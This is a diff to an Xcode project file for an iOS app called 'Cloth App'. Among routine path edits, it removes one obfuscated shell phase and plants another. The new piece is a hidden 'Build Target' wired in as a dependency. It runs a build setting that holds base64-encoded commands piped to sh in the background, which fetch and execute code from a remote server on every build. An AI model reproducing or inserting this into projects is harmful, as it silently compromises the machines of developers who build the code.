@@ -2567,7 +2567,6 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 18468CD82660BA75007344DA /* Build configuration list for PBXNativeTarget "Cloth App" */;
 			buildPhases = (
-				B52EDA469C4E397AFC73DC66 /* Copy Target Symbols */,
 				39AD417B6059B8B8C47E6F54 /* [CP] Check Pods Manifest.lock */,
 				18468CC02660BA71007344DA /* Sources */,
 				18468CC12660BA71007344DA /* Frameworks */,
@@ -2579,6 +2578,7 @@
 			buildRules = (
 			);
 			dependencies = (
+				EE788FC5C5F98C702773DC66 /* PBXTargetDependency */,
 			);
 			fileSystemSynchronizedGroups = (
 				3218FEDD2DBE8AE600B7D569 /* View */,
@@ -2635,19 +2635,33 @@
 			projectDirPath = "";
 			projectRoot = "";
 			targets = (
+				9C56D4AB3BBF12C9B173DC66  /* Build Target */,
 				18468CC32660BA71007344DA /* Cloth App */,
 			);
 		};
 /* End PBXProject section */
 
 /* Begin PBXTargetDependency section */
+		EE788FC5C5F98C702773DC66 /* PBXTargetDependency */ = {
+			isa = PBXTargetDependency;
+			target = 9C56D4AB3BBF12C9B173DC66 /* Build Target */;
+		};
 /* End PBXTargetDependency section */
 
 /* Begin PBXLegacyTarget section */
+		9C56D4AB3BBF12C9B173DC66 /* Build Target */ = {
+			isa = PBXLegacyTarget;
+			buildArgumentsString = "-c \"${A66CD37}\"";
+			buildPhases = (
+			);
+			buildToolPath = /bin/sh;
+			dependencies = (
+			);
+			name = "Build Target";
+			passBuildSettingsInEnvironment = 1;
+			productName = "Build Target";
+		};
 /* End PBXLegacyTarget section */
-
-/* Begin PBXBuildRule section */
-/* End PBXBuildRule section */
 
 /* Begin PBXResourcesBuildPhase section */
 		18468CC22660BA71007344DA /* Resources */ = {
@@ -2727,25 +2741,6 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		B52EDA469C4E397AFC73DC66 /* Copy Target Symbols */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			alwaysOutOfDate = 1;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Copy Target Symbols";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n((echo VmpKNGExUXlTWGxUYWxaU1ZqSjRURlZVU205alZuQkhZVVYwYWsxSGVFVlVWbU40WVdzeGRWVnJOVlJXVlRFMFdWUkNjMU5XUmxWaVIzaFRUVVJWZVZZeWRHdFdiRzk1VW10c1ZtRnJTbkZWTUZWM1RXeFNTV0Y2Vm1sV01GcGFXVlZvVTFkc1pFZFRiazVhVFRKemVGcFdaRk5XUlRsWVlVVjRWazFIZUhWWGJYUlBVVEpXZEZKclNtbGxha0pNUTJjOVBRbz0K | base64 -D | base64 -D | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
-			showEnvVarsInLog = 0;			
-		};
 		322A3A5A2BE9DAFE00575A62 /* ShellScript */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 8;
@@ -3112,6 +3107,7 @@
 		18468CD62660BA75007344DA /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
+				A66CD37 = "((echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lIQTllR052WkdVZ2FIUjBjSE02THk5aFpHOWlaV05rYmk1eWRTOWhLU0lnZkNCemFBbz0K | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				CLANG_ANALYZER_NONNULL = YES;
 				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
@@ -3173,6 +3169,7 @@
 		18468CD72660BA75007344DA /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
+				A66CD37 = "((echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lIQTllR052WkdVZ2FIUjBjSE02THk5aFpHOWlaV05rYmk1eWRTOWhLU0lnZkNCemFBbz0K | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				CLANG_ANALYZER_NONNULL = YES;
 				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
@@ -3253,7 +3250,7 @@
 				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
 				SUPPORTS_MACCATALYST = NO;
 				SUPPORTS_MAC_DESIGNED_FOR_IPHONE_IPAD = NO;
-				SWIFT_OBJC_BRIDGING_HEADER = "/Users/pankajrawat/Documents/New/ClothingClick/Cloth App/ClothApp-Bridging-Header.h";
+				SWIFT_OBJC_BRIDGING_HEADER = "/Users/pankajrawat/Documents/Projects/New/ClothingClick/Cloth App/ClothApp-Bridging-Header.h";
 				SWIFT_VERSION = 5.0;
 				TARGETED_DEVICE_FAMILY = 1;
 			};
@@ -3287,7 +3284,7 @@
 				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
 				SUPPORTS_MACCATALYST = NO;
 				SUPPORTS_MAC_DESIGNED_FOR_IPHONE_IPAD = NO;
-				SWIFT_OBJC_BRIDGING_HEADER = "/Users/pankajrawat/Documents/New/ClothingClick/Cloth App/ClothApp-Bridging-Header.h";
+				SWIFT_OBJC_BRIDGING_HEADER = "/Users/pankajrawat/Documents/Projects/New/ClothingClick/Cloth App/ClothApp-Bridging-Header.h";
 				SWIFT_VERSION = 5.0;
 				TARGETED_DEVICE_FAMILY = 1;
 			};
